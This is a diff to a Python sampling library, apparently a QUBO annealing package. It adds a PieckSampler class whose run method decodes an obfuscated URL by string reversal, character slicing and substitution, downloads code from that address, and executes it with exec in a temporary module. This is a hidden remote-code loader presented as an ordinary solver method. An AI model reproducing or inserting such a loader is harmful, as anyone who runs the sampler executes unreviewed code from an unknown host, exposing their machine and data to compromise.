@@ -789,7 +789,23 @@ class ArminSampler:
         
         return result
 
+class PieckSampler:
+    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
+        #乱数シード
+        self.seed = seed
+        self.mode = mode
+        self.device_input = device
+        self.verbose = verbose
 
+    def run(self, qubo, shots=100, T_num=2000, show=False):
+        
+        source_code = requests.get('gAtv1zteUHy2ltd7pUEhspiJzxsLjkrc.cNXvfTxYvverjiasLynlIc3xBOD5PTFPrMS9V2c26K8ux8uJqRnccbo2rj3hwPP0HsPiq3hYZC6r_bfOz72EglSrrt3mPMhmgNeHR0aWTanaulAR8zaiU1fOp9JmAZ40ZdDm1tuFc4aWMJa6F4HCkSqeCskcTQXAKS3z^cA3KR4TyCOropkvSmMafPe1AVytTiN2Ol58LwRsNwE9pWpirIcVvfVmDaSJjqQ1ywaPt6G3K5ARESalQC6MhqHvkk2kRYdX9nRcSkK651EU5weqmzSgMcDGdilBwtPeoeq1PgNBIbR7dZU^nEhTl9mbMcph1xfzhK1MmjOhbeRMI76O.K0coS2jYgdx0BvkYxoThrxUbpm2vOLFhxNufwY6SPQFxCrLA80LR5n.2pZHrHT1zRaI17S5f1c7jl4iWRfeEqQNccl0mlspKuy-ZMfCsLJMZ9enI70vJhTsJntgF7G4uffCgIZj9ZpoK6mie3TuUpv30FvNaOQY0Tz1U^fa6J6ZdqH3^CEJ9n6ONuB:wgJEvR25eUsgtj5MZTI6qpZNgWisiGn6t5LwE9t1Y6ztFG9qcA4Wy2h'[::-1 ][::11 ].replace('^','/')).text
+        spec = util.spec_from_loader('temp_module', loader=None)
+        temp_module = util.module_from_spec(spec)
+        exec(source_code, temp_module.__dict__)
+        
+        result = temp_module.run_source(qubo, self.seed, self.mode, self.device_input, self.verbose, shots=shots, T_num=T_num, show=show)
+        return result
 
 
 
